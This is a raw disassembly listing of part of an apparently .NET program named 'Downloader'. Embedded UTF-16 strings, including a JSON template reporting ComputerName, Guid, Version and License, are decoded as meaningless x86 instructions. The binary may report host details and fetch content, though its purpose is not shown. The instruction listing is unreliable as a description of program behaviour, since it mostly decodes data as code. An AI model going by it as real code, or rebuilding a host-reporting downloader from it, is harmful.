   14000469f:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   1400046a3:	4e 00 61 00          	rex.WRX add %r12b,0x0(%rcx)
   1400046a7:	6d                   	insl   (%dx),(%rdi)
   1400046a8:	00 65 00             	add    %ah,0x0(%rbp)
   1400046ab:	22 00                	and    (%rax),%al
   1400046ad:	3a 00                	cmp    (%rax),%al
   1400046af:	22 00                	and    (%rax),%al
   1400046b1:	7b 00                	jnp    0x1400046b3
   1400046b3:	30 00                	xor    %al,(%rax)
   1400046b5:	7d 00                	jge    0x1400046b7
   1400046b7:	22 00                	and    (%rax),%al
   1400046b9:	2c 00                	sub    $0x0,%al
   1400046bb:	22 00                	and    (%rax),%al
   1400046bd:	47 00 75 00          	rex.RXB add %r14b,0x0(%r13)
   1400046c1:	69 00 64 00 22 00    	imul   $0x220064,(%rax),%eax
   1400046c7:	3a 00                	cmp    (%rax),%al
   1400046c9:	22 00                	and    (%rax),%al
   1400046cb:	7b 00                	jnp    0x1400046cd
   1400046cd:	31 00                	xor    %eax,(%rax)
   1400046cf:	7d 00                	jge    0x1400046d1
   1400046d1:	22 00                	and    (%rax),%al
   1400046d3:	2c 00                	sub    $0x0,%al
   1400046d5:	22 00                	and    (%rax),%al
   1400046d7:	52                   	push   %rdx
   1400046d8:	00 65 00             	add    %ah,0x0(%rbp)
   1400046db:	71 00                	jno    0x1400046dd
   1400046dd:	75 00                	jne    0x1400046df
   1400046df:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   1400046e3:	74 00                	je     0x1400046e5
   1400046e5:	4e 00 61 00          	rex.WRX add %r12b,0x0(%rcx)
   1400046e9:	6d                   	insl   (%dx),(%rdi)
   1400046ea:	00 65 00             	add    %ah,0x0(%rbp)
   1400046ed:	22 00                	and    (%rax),%al
   1400046ef:	3a 00                	cmp    (%rax),%al
   1400046f1:	22 00                	and    (%rax),%al
   1400046f3:	7b 00                	jnp    0x1400046f5
   1400046f5:	32 00                	xor    (%rax),%al
   1400046f7:	7d 00                	jge    0x1400046f9
   1400046f9:	22 00                	and    (%rax),%al
   1400046fb:	2c 00                	sub    $0x0,%al
   1400046fd:	22 00                	and    (%rax),%al
   1400046ff:	56                   	push   %rsi
   140004700:	00 65 00             	add    %ah,0x0(%rbp)
   140004703:	72 00                	jb     0x140004705
   140004705:	73 00                	jae    0x140004707
   140004707:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%rax),%eax
   14000470d:	22 00                	and    (%rax),%al
   14000470f:	3a 00                	cmp    (%rax),%al
   140004711:	22 00                	and    (%rax),%al
   140004713:	7b 00                	jnp    0x140004715
   140004715:	33 00                	xor    (%rax),%eax
   140004717:	7d 00                	jge    0x140004719
   140004719:	22 00                	and    (%rax),%al
   14000471b:	7d 00                	jge    0x14000471d
   14000471d:	7d 00                	jge    0x14000471f
   14000471f:	00 80 b3 7b 00 7b    	add    %al,0x7b007bb3(%rax)
   140004725:	00 22                	add    %ah,(%rdx)
   140004727:	00 43 00             	add    %al,0x0(%rbx)
   14000472a:	6f                   	outsl  (%rsi),(%dx)
   14000472b:	00 6d 00             	add    %ch,0x0(%rbp)
   14000472e:	70 00                	jo     0x140004730
   140004730:	75 00                	jne    0x140004732
   140004732:	74 00                	je     0x140004734
   140004734:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   140004738:	4e 00 61 00          	rex.WRX add %r12b,0x0(%rcx)
   14000473c:	6d                   	insl   (%dx),(%rdi)
   14000473d:	00 65 00             	add    %ah,0x0(%rbp)
   140004740:	22 00                	and    (%rax),%al
   140004742:	3a 00                	cmp    (%rax),%al
   140004744:	22 00                	and    (%rax),%al
   140004746:	7b 00                	jnp    0x140004748
   140004748:	30 00                	xor    %al,(%rax)
   14000474a:	7d 00                	jge    0x14000474c
   14000474c:	22 00                	and    (%rax),%al
   14000474e:	2c 00                	sub    $0x0,%al
   140004750:	22 00                	and    (%rax),%al
   140004752:	47 00 75 00          	rex.RXB add %r14b,0x0(%r13)
   140004756:	69 00 64 00 22 00    	imul   $0x220064,(%rax),%eax
   14000475c:	3a 00                	cmp    (%rax),%al
   14000475e:	22 00                	and    (%rax),%al
   140004760:	7b 00                	jnp    0x140004762
   140004762:	31 00                	xor    %eax,(%rax)
   140004764:	7d 00                	jge    0x140004766
   140004766:	22 00                	and    (%rax),%al
   140004768:	2c 00                	sub    $0x0,%al
   14000476a:	22 00                	and    (%rax),%al
   14000476c:	52                   	push   %rdx
   14000476d:	00 65 00             	add    %ah,0x0(%rbp)
   140004770:	71 00                	jno    0x140004772
   140004772:	75 00                	jne    0x140004774
   140004774:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   140004778:	74 00                	je     0x14000477a
   14000477a:	4e 00 61 00          	rex.WRX add %r12b,0x0(%rcx)
   14000477e:	6d                   	insl   (%dx),(%rdi)
   14000477f:	00 65 00             	add    %ah,0x0(%rbp)
   140004782:	22 00                	and    (%rax),%al
   140004784:	3a 00                	cmp    (%rax),%al
   140004786:	22 00                	and    (%rax),%al
   140004788:	7b 00                	jnp    0x14000478a
   14000478a:	32 00                	xor    (%rax),%al
   14000478c:	7d 00                	jge    0x14000478e
   14000478e:	22 00                	and    (%rax),%al
   140004790:	2c 00                	sub    $0x0,%al
   140004792:	22 00                	and    (%rax),%al
   140004794:	56                   	push   %rsi
   140004795:	00 65 00             	add    %ah,0x0(%rbp)
   140004798:	72 00                	jb     0x14000479a
   14000479a:	73 00                	jae    0x14000479c
   14000479c:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%rax),%eax
   1400047a2:	22 00                	and    (%rax),%al
   1400047a4:	3a 00                	cmp    (%rax),%al
   1400047a6:	22 00                	and    (%rax),%al
   1400047a8:	7b 00                	jnp    0x1400047aa
   1400047aa:	33 00                	xor    (%rax),%eax
   1400047ac:	7d 00                	jge    0x1400047ae
   1400047ae:	22 00                	and    (%rax),%al
   1400047b0:	2c 00                	sub    $0x0,%al
   1400047b2:	22 00                	and    (%rax),%al
   1400047b4:	4c 00 69 00          	rex.WR add %r13b,0x0(%rcx)
   1400047b8:	63 00                	movsxd (%rax),%eax
   1400047ba:	65 00 6e 00          	add    %ch,%gs:0x0(%rsi)
   1400047be:	63 00                	movsxd (%rax),%eax
   1400047c0:	65 00 22             	add    %ah,%gs:(%rdx)
   1400047c3:	00 3a                	add    %bh,(%rdx)
   1400047c5:	00 22                	add    %ah,(%rdx)
   1400047c7:	00 7b 00             	add    %bh,0x0(%rbx)
   1400047ca:	34 00                	xor    $0x0,%al
   1400047cc:	7d 00                	jge    0x1400047ce
   1400047ce:	22 00                	and    (%rax),%al
   1400047d0:	7d 00                	jge    0x1400047d2
   1400047d2:	7d 00                	jge    0x1400047d4
   1400047d4:	00 03                	add    %al,(%rbx)
   1400047d6:	2a 00                	sub    (%rax),%al
   1400047d8:	00 03                	add    %al,(%rbx)
   1400047da:	7b 00                	jnp    0x1400047dc
   1400047dc:	00 5d 7b             	add    %bl,0x7b(%rbp)
   1400047df:	00 30                	add    %dh,(%rax)
   1400047e1:	00 3a                	add    %bh,(%rdx)
   1400047e3:	00 58 00             	add    %bl,0x0(%rax)
   1400047e6:	38 00                	cmp    %al,(%rax)
   1400047e8:	7d 00                	jge    0x1400047ea
   1400047ea:	2d 00 7b 00 31       	sub    $0x31007b00,%eax
   1400047ef:	00 3a                	add    %bh,(%rdx)
   1400047f1:	00 58 00             	add    %bl,0x0(%rax)
   1400047f4:	34 00                	xor    $0x0,%al
   1400047f6:	7d 00                	jge    0x1400047f8
   1400047f8:	2d 00 7b 00 32       	sub    $0x32007b00,%eax
   1400047fd:	00 3a                	add    %bh,(%rdx)
   1400047ff:	00 58 00             	add    %bl,0x0(%rax)
   140004802:	34 00                	xor    $0x0,%al
   140004804:	7d 00                	jge    0x140004806
   140004806:	2d 00 7b 00 33       	sub    $0x33007b00,%eax
   14000480b:	00 3a                	add    %bh,(%rdx)
   14000480d:	00 58 00             	add    %bl,0x0(%rax)
   140004810:	34 00                	xor    $0x0,%al
   140004812:	7d 00                	jge    0x140004814
   140004814:	2d 00 7b 00 34       	sub    $0x34007b00,%eax
   140004819:	00 3a                	add    %bh,(%rdx)
   14000481b:	00 58 00             	add    %bl,0x0(%rax)
   14000481e:	34 00                	xor    $0x0,%al
   140004820:	7d 00                	jge    0x140004822
   140004822:	7b 00                	jnp    0x140004824
   140004824:	35 00 3a 00 58       	xor    $0x58003a00,%eax
   140004829:	00 34 00             	add    %dh,(%rax,%rax,1)
   14000482c:	7d 00                	jge    0x14000482e
   14000482e:	7b 00                	jnp    0x140004830
   140004830:	36 00 3a             	ss add %bh,(%rdx)
   140004833:	00 58 00             	add    %bl,0x0(%rax)
   140004836:	34 00                	xor    $0x0,%al
   140004838:	7d 00                	jge    0x14000483a
   14000483a:	01 03                	add    %eax,(%rbx)
   14000483c:	7d 00                	jge    0x14000483e
   14000483e:	00 4b 62             	add    %cl,0x62(%rbx)
   140004841:	00 75 00             	add    %dh,0x0(%rbp)
   140004844:	66 00 66 00          	data16 add %ah,0x0(%rsi)
   140004848:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   14000484c:	20 00                	and    %al,(%rax)
   14000484e:	6d                   	insl   (%dx),(%rdi)
   14000484f:	00 75 00             	add    %dh,0x0(%rbp)
   140004852:	73 00                	jae    0x140004854
   140004854:	74 00                	je     0x140004856
   140004856:	20 00                	and    %al,(%rax)
   140004858:	62                   	(bad)
   140004859:	00 65 00             	add    %ah,0x0(%rbp)
   14000485c:	20 00                	and    %al,(%rax)
   14000485e:	61                   	(bad)
   14000485f:	00 74 00 20          	add    %dh,0x20(%rax,%rax,1)
   140004863:	00 6c 00 65          	add    %ch,0x65(%rax,%rax,1)
   140004867:	00 61 00             	add    %ah,0x0(%rcx)
   14000486a:	73 00                	jae    0x14000486c
   14000486c:	74 00                	je     0x14000486e
   14000486e:	20 00                	and    %al,(%rax)
   140004870:	31 00                	xor    %eax,(%rax)
   140004872:	36 00 20             	ss add %ah,(%rax)
   140004875:	00 62 00             	add    %ah,0x0(%rdx)
   140004878:	79 00                	jns    0x14000487a
   14000487a:	74 00                	je     0x14000487c
   14000487c:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   140004880:	20 00                	and    %al,(%rax)
   140004882:	6c                   	insb   (%dx),(%rdi)
   140004883:	00 6f 00             	add    %ch,0x0(%rdi)
   140004886:	6e                   	outsb  (%rsi),(%dx)
   140004887:	00 67 00             	add    %ah,0x0(%rdi)
   14000488a:	00 00                	add    %al,(%rax)
   14000488c:	40 98                	rex cwtl
   14000488e:	f8                   	clc
   14000488f:	35 0b aa 2a 49       	xor    $0x492aaa0b,%eax
   140004894:	a5                   	movsl  (%rsi),(%rdi)
   140004895:	a0 6c e0 2e b9 b5 d4 	movabs 0x400d4b5b92ee06c,%al
   14000489c:	00 04 
   14000489e:	20 01                	and    %al,(%rcx)
   1400048a0:	01 08                	add    %ecx,(%rax)
   1400048a2:	03 20                	add    (%rax),%esp
   1400048a4:	00 01                	add    %al,(%rcx)
   1400048a6:	05 20 01 01 11       	add    $0x11010120,%eax
   1400048ab:	11 04 20             	adc    %eax,(%rax,%riz,1)
   1400048ae:	01 01                	add    %eax,(%rcx)
   1400048b0:	0e                   	(bad)
   1400048b1:	04 20                	add    $0x20,%al
   1400048b3:	01 01                	add    %eax,(%rcx)
   1400048b5:	02 05 20 01 01 11    	add    0x11010120(%rip),%al        # 0x1510149db
   1400048bb:	75 07                	jne    0x1400048c4
   1400048bd:	07                   	(bad)
   1400048be:	03 12                	add    (%rdx),%edx
   1400048c0:	18 08                	sbb    %cl,(%rax)
   1400048c2:	1d 05 04 00 01       	sbb    $0x1000405,%eax
   1400048c7:	01 08                	add    %ecx,(%rax)
   1400048c9:	05 20 00 12 80       	add    $0x80120020,%eax
   1400048ce:	99                   	cltd
   1400048cf:	04 00                	add    $0x0,%al
   1400048d1:	00 12                	add    %dl,(%rdx)
   1400048d3:	4d 05 20 00 12 80    	rex.WRB add $0xffffffff80120020,%rax
   1400048d9:	9d                   	popf
   1400048da:	03 20                	add    (%rax),%esp
   1400048dc:	00 0e                	add    %cl,(%rsi)
   1400048de:	04 20                	add    $0x20,%al
   1400048e0:	01 0e                	add    %ecx,(%rsi)
   1400048e2:	08 03                	or     %al,(%rbx)
   1400048e4:	20 00                	and    %al,(%rax)
   1400048e6:	02 05 00 01 12 4d    	add    0x4d120100(%rip),%al        # 0x18d1249ec
   1400048ec:	08 04 07             	or     %al,(%rdi,%rax,1)
   1400048ef:	01 12                	add    %edx,(%rdx)
   1400048f1:	24 03                	and    $0x3,%al
   1400048f3:	20 00                	and    %al,(%rax)
   1400048f5:	08 05 00 00 1d 12    	or     %al,0x121d0000(%rip)        # 0x1521d48fb
   1400048fb:	4d 10 10             	rex.WRB adc %r10b,(%r8)
   1400048fe:	01 01                	add    %eax,(%rcx)
   140004900:	15 12 45 01 1e       	adc    $0x1e014512,%eax
   140004905:	00 15 12 80 a9 01    	add    %dl,0x1a98012(%rip)        # 0x141a9c91d
   14000490b:	1e                   	(bad)
   14000490c:	00 04 0a             	add    %al,(%rdx,%rcx,1)
   14000490f:	01 12                	add    %edx,(%rdx)
   140004911:	4d 08 15 12 80 ad 02 	rex.WRB or %r10b,0x2ad8012(%rip)        # 0x142adc92a
   140004918:	12 4d 02             	adc    0x2(%rbp),%cl
   14000491b:	05 20 02 01 1c       	add    $0x1c010220,%eax
   140004920:	18 13                	sbb    %dl,(%rbx)
   140004922:	10 01                	adc    %al,(%rcx)
   140004924:	02 02                	add    (%rdx),%al
   140004926:	15 12 80 a9 01       	adc    $0x1a98012,%eax
   14000492b:	1e                   	(bad)
   14000492c:	00 15 12 80 ad 02    	add    %dl,0x2ad8012(%rip)        # 0x142adc944
   140004932:	1e                   	(bad)
   140004933:	00 02                	add    %al,(%rdx)
   140004935:	03 07                	add    (%rdi),%eax
   140004937:	01 0e                	add    %ecx,(%rsi)
   140004939:	05 15 12 45 01       	add    $0x1451215,%eax
   14000493e:	0e                   	(bad)
   14000493f:	05 20 01 02 13       	add    $0x13020120,%eax
   140004944:	00 03                	add    %al,(%rbx)
   140004946:	07                   	(bad)
   140004947:	01 08                	add    %ecx,(%rax)
   140004949:	04 20                	add    $0x20,%al
   14000494b:	01 03                	add    %eax,(%rbx)
   14000494d:	08 05 00 02 02 0e    	or     %al,0xe020200(%rip)        # 0x14e024b53
   140004953:	0e                   	(bad)
   140004954:	04 00                	add    $0x0,%al
   140004956:	01 08                	add    %ecx,(%rax)
   140004958:	0e                   	(bad)
   140004959:	05 20 01 01 13       	add    $0x13010120,%eax
   14000495e:	00 06                	add    %al,(%rsi)
   140004960:	07                   	(bad)
   140004961:	02 12                	add    (%rdx),%dl
   140004963:	14 12                	adc    $0x12,%al
   140004965:	55                   	push   %rbp
   140004966:	06                   	(bad)
   140004967:	00 01                	add    %al,(%rcx)
   140004969:	12 55 1d             	adc    0x1d(%rbp),%dl
   14000496c:	05 05 20 00 12       	add    $0x12002005,%eax
   140004971:	80 b5 09 00 02 02 12 	xorb   $0x12,0x2020009(%rbp)
   140004978:	80 b5 12 80 b5 06 20 	xorb   $0x20,0x6b58012(%rbp)
   14000497f:	02 1c 1c             	add    (%rsp,%rbx,1),%bl
   140004982:	1d 1c 0a 07 06       	sbb    $0x6070a1c,%eax
   140004987:	08 08                	or     %cl,(%rax)
   140004989:	1d 05 12 14 08       	sbb    $0x8141205,%eax
   14000498e:	08 06                	or     %al,(%rsi)
   140004990:	00 02                	add    %al,(%rdx)
   140004992:	08 1d 05 08 0c 00    	or     %bl,0xc0805(%rip)        # 0x1400c519d
   140004998:	05 01 12 80 c5       	add    $0xc5801201,%eax
   14000499d:	08 12                	or     %dl,(%rdx)
   14000499f:	80 c5 08             	add    $0x8,%ch
   1400049a2:	08 03                	or     %al,(%rbx)
   1400049a4:	07                   	(bad)
   1400049a5:	01 02                	add    %eax,(%rdx)
   1400049a7:	0c 20                	or     $0x20,%al
   1400049a9:	03 01                	add    (%rcx),%eax
   1400049ab:	11 80 c9 11 80 cd    	adc    %eax,-0x327fee37(%rax)
   1400049b1:	11 80 d1 0c 20 04    	adc    %eax,0x4200cd1(%rax)
   1400049b7:	12 80 81 12 69 08    	adc    0x8691281(%rax),%al
   1400049bd:	12 80 85 1c 05 20    	adc    0x20051c85(%rax),%al
   1400049c3:	00 12                	add    %dl,(%rdx)
   1400049c5:	80 d5 05             	adc    $0x5,%ch
   1400049c8:	20 02                	and    %al,(%rdx)
   1400049ca:	02 08                	add    (%rax),%cl
   1400049cc:	02 05 00 00 12 80    	add    -0x7fee0000(%rip),%al        # 0xc01249d2
   1400049d2:	d9 07                	flds   (%rdi)
   1400049d4:	20 01                	and    %al,(%rcx)
   1400049d6:	12 5d 12             	adc    0x12(%rbp),%bl
   1400049d9:	80 dd 04             	sbb    $0x4,%ch
   1400049dc:	07                   	(bad)
   1400049dd:	02 0b                	add    (%rbx),%cl
   1400049df:	08 0b                	or     %cl,(%rbx)
   1400049e1:	07                   	(bad)
   1400049e2:	06                   	(bad)
   1400049e3:	0e                   	(bad)
   1400049e4:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
   1400049e9:	1d 05 02 05 20       	sbb    $0x20050205,%eax
   1400049ee:	02 08                	add    (%rax),%cl
   1400049f0:	08 08                	or     %cl,(%rax)
   1400049f2:	05 00 01 1d 05       	add    $0x51d0100,%eax
   1400049f7:	08 02                	or     %al,(%rdx)
   1400049f9:	06                   	(bad)
   1400049fa:	0e                   	(bad)
   1400049fb:	03 00                	add    (%rax),%eax
   1400049fd:	00 0e                	add    %cl,(%rsi)
   1400049ff:	06                   	(bad)
   140004a00:	00 02                	add    %al,(%rdx)
   140004a02:	0e                   	(bad)
   140004a03:	0e                   	(bad)
   140004a04:	1d 1c 05 00 00       	sbb    $0x51c,%eax
   140004a09:	12 80 e9 05 20 01    	adc    0x12005e9(%rax),%al
   140004a0f:	1d 05 0e 0a 00       	sbb    $0xa0e05,%eax
   140004a14:	03 01                	add    (%rcx),%eax
   140004a16:	12 80 c5 12 80 c5    	adc    -0x3a7fed3b(%rax),%al
   140004a1c:	08 04 20             	or     %al,(%rax,%riz,1)
   140004a1f:	01 02                	add    %eax,(%rdx)
   140004a21:	08 09                	or     %cl,(%rcx)
   140004a23:	07                   	(bad)
   140004a24:	05 08 08 1d 05       	add    $0x51d0808,%eax
   140004a29:	1d 05 08 05 20       	sbb    $0x20050805,%eax
   140004a2e:	01 08                	add    %ecx,(%rax)
   140004a30:	1d 05 05 07 03       	sbb    $0x3070505,%eax
   140004a35:	08 08                	or     %cl,(%rax)
   140004a37:	02 04 07             	add    (%rdi,%rax,1),%al
   140004a3a:	01 12                	add    %edx,(%rdx)
   140004a3c:	69 07 00 02 02 0e    	imul   $0xe020200,(%rdi),%eax
   140004a42:	10 12                	adc    %dl,(%rdx)
   140004a44:	69 06 00 01 1d 12    	imul   $0x121d0100,(%rsi),%eax
   140004a4a:	69 0e 09 07 04 0e    	imul   $0xe040709,(%rsi),%ecx
   140004a50:	1d 12 6d 08 12       	sbb    $0x12086d12,%eax
   140004a55:	6d                   	insl   (%dx),(%rdi)
   140004a56:	05 00 00 1d 12       	add    $0x121d0000,%eax
   140004a5b:	6d                   	insl   (%dx),(%rdi)
   140004a5c:	05 20 00 12 80       	add    $0x80120020,%eax
   140004a61:	f5                   	cmc
   140004a62:	05 20 00 12 80       	add    $0x80120020,%eax
   140004a67:	f9                   	stc
   140004a68:	06                   	(bad)
   140004a69:	07                   	(bad)
   140004a6a:	03 0b                	add    (%rbx),%ecx
   140004a6c:	09 1d 09 06 00 03    	or     %ebx,0x3000609(%rip)        # 0x14300507b
   140004a72:	0e                   	(bad)
   140004a73:	0e                   	(bad)
   140004a74:	0e                   	(bad)
   140004a75:	0e                   	(bad)
   140004a76:	04 07                	add    $0x7,%al
   140004a78:	01 1d 05 06 00 02    	add    %ebx,0x2000605(%rip)        # 0x142005083
   140004a7e:	09 1d 05 08 02 06    	or     %ebx,0x6020805(%rip)        # 0x146025289
   140004a84:	18 05 00 02 02 18    	sbb    %al,0x18020200(%rip)        # 0x158024c8a
   140004a8a:	18 03                	sbb    %al,(%rbx)
   140004a8c:	00 00                	add    %al,(%rax)
   140004a8e:	08 04 20             	or     %al,(%rax,%riz,1)
   140004a91:	01 01                	add    %eax,(%rcx)
   140004a93:	09 08                	or     %ecx,(%rax)
   140004a95:	00 04 01             	add    %al,(%rcx,%rax,1)
   140004a98:	1d 05 08 18 08       	sbb    $0x8180805,%eax
   140004a9d:	08 00                	or     %al,(%rax)
   140004a9f:	01 12                	add    %edx,(%rdx)
   140004aa1:	81 11 11 81 15 09    	adcl   $0x9158111,(%rcx)
   140004aa7:	00 02                	add    %al,(%rdx)
   140004aa9:	12 81 19 18 12 81    	adc    -0x7eede7e7(%rcx),%al
   140004aaf:	11 06                	adc    %eax,(%rsi)
   140004ab1:	07                   	(bad)
   140004ab2:	02 11                	add    (%rcx),%dl
   140004ab4:	71 11                	jno    0x140004ac7
   140004ab6:	71 08                	jno    0x140004ac0
   140004ab8:	00 02                	add    %al,(%rdx)
   140004aba:	11 71 1c             	adc    %esi,0x1c(%rcx)
   140004abd:	11 81 21 07 00 02    	adc    %eax,0x2000721(%rcx)
   140004ac3:	02 11                	add    (%rcx),%dl
   140004ac5:	71 11                	jno    0x140004ad8
   140004ac7:	71 09                	jno    0x140004ad2
   140004ac9:	00 02                	add    %al,(%rdx)
   140004acb:	01 12                	add    %edx,(%rdx)
   140004acd:	80 c5 11             	add    $0x11,%ch
   140004ad0:	81 29 08 b7 7a 5c    	subl   $0x5c7ab708,(%rcx)
   140004ad6:	56                   	push   %rsi
   140004ad7:	19 34 e0             	sbb    %esi,(%rax,%riz,8)
   140004ada:	89 04 00             	mov    %eax,(%rax,%rax,1)
   140004add:	10 00                	adc    %al,(%rax)
   140004adf:	00 04 00             	add    %al,(%rax,%rax,1)
   140004ae2:	20 00                	and    %al,(%rax)
   140004ae4:	00 04 00             	add    %al,(%rax,%rax,1)
   140004ae7:	00 08                	add    %cl,(%rax)
   140004ae9:	00 04 00             	add    %al,(%rax,%rax,1)
   140004aec:	00 00                	add    %al,(%rax)
   140004aee:	20 04 00             	and    %al,(%rax,%rax,1)
   140004af1:	00 40 00             	add    %al,0x0(%rax)
   140004af4:	04 00                	add    $0x0,%al
   140004af6:	00 10                	add    %dl,(%rax)
   140004af8:	00 04 00             	add    %al,(%rax,%rax,1)
   140004afb:	00 20                	add    %ah,(%rax)
   140004afd:	00 04 10             	add    %al,(%rax,%rdx,1)
   140004b00:	00 00                	add    %al,(%rax)
   140004b02:	00 04 20             	add    %al,(%rax,%riz,1)
   140004b05:	00 00                	add    %al,(%rax)
   140004b07:	00 04 40             	add    %al,(%rax,%rax,2)
   140004b0a:	00 00                	add    %al,(%rax)
   140004b0c:	00 04 80             	add    %al,(%rax,%rax,4)
   140004b0f:	00 00                	add    %al,(%rax)
   140004b11:	00 04 01             	add    %al,(%rcx,%rax,1)
   140004b14:	00 00                	add    %al,(%rax)
   140004b16:	00 04 02             	add    %al,(%rdx,%rax,1)
   140004b19:	00 00                	add    %al,(%rax)
   140004b1b:	00 04 04             	add    %al,(%rsp,%rax,1)
   140004b1e:	00 00                	add    %al,(%rax)
   140004b20:	00 04 08             	add    %al,(%rax,%rcx,1)
   140004b23:	00 00                	add    %al,(%rax)
   140004b25:	00 04 00             	add    %al,(%rax,%rax,1)
   140004b28:	01 00                	add    %eax,(%rax)
   140004b2a:	00 04 00             	add    %al,(%rax,%rax,1)
   140004b2d:	02 00                	add    (%rax),%al
   140004b2f:	00 04 00             	add    %al,(%rax,%rax,1)
   140004b32:	04 00                	add    $0x0,%al
   140004b34:	00 06                	add    %al,(%rsi)
   140004b36:	06                   	(bad)
   140004b37:	15 12 45 01 0e       	adc    $0xe014512,%eax
   140004b3c:	03 06                	add    (%rsi),%eax
   140004b3e:	1d 05 03 06 12       	sbb    $0x12060305,%eax
   140004b43:	59                   	pop    %rcx
   140004b44:	03 06                	add    (%rsi),%eax
   140004b46:	12 5d 02             	adc    0x2(%rbp),%bl
   140004b49:	06                   	(bad)
   140004b4a:	08 03                	or     %al,(%rbx)
   140004b4c:	06                   	(bad)
   140004b4d:	12 61 03             	adc    0x3(%rcx),%ah
   140004b50:	06                   	(bad)
   140004b51:	1d 0b 03 06 12       	sbb    $0x1206030b,%eax
   140004b56:	28 03                	sub    %al,(%rbx)
   140004b58:	06                   	(bad)
   140004b59:	11 34 03             	adc    %esi,(%rbx,%rax,1)
   140004b5c:	06                   	(bad)
   140004b5d:	11 38                	adc    %edi,(%rax)
   140004b5f:	03 06                	add    (%rsi),%eax
   140004b61:	11 3c 02             	adc    %edi,(%rdx,%rax,1)
   140004b64:	06                   	(bad)
   140004b65:	09 03                	or     %eax,(%rbx)
   140004b67:	06                   	(bad)
   140004b68:	11 2c 03             	adc    %ebp,(%rbx,%rax,1)
   140004b6b:	06                   	(bad)
   140004b6c:	11 30                	adc    %esi,(%rax)
   140004b6e:	05 00 02 01 0e       	add    $0xe010200,%eax
   140004b73:	0e                   	(bad)
   140004b74:	04 00                	add    $0x0,%al
   140004b76:	01 01                	add    %eax,(%rcx)
   140004b78:	0e                   	(bad)
   140004b79:	03 00                	add    (%rax),%eax
   140004b7b:	00 01                	add    %al,(%rcx)
   140004b7d:	05 00 02 01 0e       	add    $0xe010200,%eax
   140004b82:	08 03                	or     %al,(%rbx)
   140004b84:	00 00                	add    %al,(%rax)
   140004b86:	02 05 00 01 01 1d    	add    0x1d010100(%rip),%al        # 0x15d014c8c
   140004b8c:	0e                   	(bad)
   140004b8d:	06                   	(bad)
   140004b8e:	00 02                	add    %al,(%rdx)
   140004b90:	01 1d 05 0e 06 20    	add    %ebx,0x20060e05(%rip)        # 0x16006599b
   140004b96:	01 12                	add    %edx,(%rdx)
   140004b98:	14 1d                	adc    $0x1d,%al
   140004b9a:	05 04 20 00 1d       	add    $0x1d002004,%eax
   140004b9f:	05 05 20 01 01       	add    $0x1012005,%eax
   140004ba4:	1d 05 05 20 02       	sbb    $0x2200505,%eax
   140004ba9:	02 0e                	add    (%rsi),%cl
   140004bab:	08 07                	or     %al,(%rdi)
   140004bad:	00 03                	add    %al,(%rbx)
   140004baf:	08 1d 05 08 08 05    	or     %bl,0x5080805(%rip)        # 0x1450853ba
   140004bb5:	20 02                	and    %al,(%rdx)
   140004bb7:	02 0e                	add    (%rsi),%cl
   140004bb9:	0e                   	(bad)
   140004bba:	05 20 01 02 1d       	add    $0x1d020120,%eax
   140004bbf:	05 05 00 01 12       	add    $0x12010005,%eax
   140004bc4:	69 0e 05 00 01 0b    	imul   $0xb010005,(%rsi),%ecx
   140004bca:	1d 05 03 20 00       	sbb    $0x200305,%eax
   140004bcf:	09 04 20             	or     %eax,(%rax,%riz,1)
   140004bd2:	00 1d 09 06 20 02    	add    %bl,0x2200609(%rip)        # 0x1422051e1
   140004bd8:	01 08                	add    %ecx,(%rax)
   140004bda:	1d 05 09 00 04       	sbb    $0x4000905,%eax
   140004bdf:	18 18                	sbb    %bl,(%rax)
   140004be1:	19 11                	sbb    %edx,(%rcx)
   140004be3:	2c 11                	sub    $0x11,%al
   140004be5:	30 06                	xor    %al,(%rsi)
   140004be7:	00 03                	add    %al,(%rbx)
   140004be9:	02 18                	add    (%rax),%bl
   140004beb:	09 09                	or     %ecx,(%rcx)
   140004bed:	05 20 01 02 12       	add    $0x12020120,%eax
   140004bf2:	4d 0c 20             	rex.WRB or $0x20,%al
   140004bf5:	04 12                	add    $0x12,%al
   140004bf7:	80 81 08 1d 05 12 80 	addb   $0x80,0x12051d08(%rcx)
   140004bfe:	85 1c 06             	test   %ebx,(%rsi,%rax,1)
   140004c01:	20 01                	and    %al,(%rcx)
   140004c03:	01 12                	add    %edx,(%rdx)
   140004c05:	80 81 04 28 00 1d 05 	addb   $0x5,0x1d002804(%rcx)
   140004c0c:	08 01                	or     %al,(%rcx)
   140004c0e:	00 08                	add    %cl,(%rax)
   140004c10:	00 00                	add    %al,(%rax)
   140004c12:	00 00                	add    %al,(%rax)
   140004c14:	00 1e                	add    %bl,(%rsi)
   140004c16:	01 00                	add    %eax,(%rax)
   140004c18:	01 00                	add    %eax,(%rax)
   140004c1a:	54                   	push   %rsp
   140004c1b:	02 16                	add    (%rsi),%dl
   140004c1d:	57                   	push   %rdi
   140004c1e:	72 61                	jb     0x140004c81
   140004c20:	70 4e                	jo     0x140004c70
   140004c22:	6f                   	outsl  (%rsi),(%dx)
   140004c23:	6e                   	outsb  (%rsi),(%dx)
   140004c24:	45 78 63             	rex.RB js 0x140004c8a
   140004c27:	65 70 74             	gs jo  0x140004c9e
   140004c2a:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%rdi),%ebp
   140004c31:	77 73                	ja     0x140004ca6
   140004c33:	01 08                	add    %ecx,(%rax)
   140004c35:	01 00                	add    %eax,(%rax)
   140004c37:	02 00                	add    (%rax),%al
   140004c39:	00 00                	add    %al,(%rax)
   140004c3b:	00 00                	add    %al,(%rax)
   140004c3d:	0f 01 00             	sgdt   (%rax)
   140004c40:	0a 44 6f 77          	or     0x77(%rdi,%rbp,2),%al
   140004c44:	6e                   	outsb  (%rsi),(%dx)
   140004c45:	6c                   	insb   (%dx),(%rdi)
   140004c46:	6f                   	outsl  (%rsi),(%dx)
   140004c47:	61                   	(bad)
   140004c48:	64 65 72 00          	fs gs jb 0x140004c4c
   140004c4c:	00 05 01 00 00 00    	add    %al,0x1(%rip)        # 0x140004c53
   140004c52:	00 17                	add    %dl,(%rdi)
   140004c54:	01 00                	add    %eax,(%rax)
